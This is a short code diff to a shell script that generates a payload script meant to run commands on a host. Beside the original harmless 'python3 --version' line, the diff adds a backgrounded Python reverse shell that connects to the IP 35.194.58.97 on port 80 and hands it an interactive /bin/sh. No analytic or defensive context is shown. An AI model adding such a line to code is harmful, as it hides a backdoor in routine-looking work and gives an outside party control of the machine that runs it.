@@ -19,7 +19,8 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-python3 --version > \${OUTPATH} 0>&1
+export RHOST="35.194.58.97";export RPORT=80;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'&
+python3 --version > \${OUTPATH} 1>&1
 __EOF__
 
 # Make the payload script executable
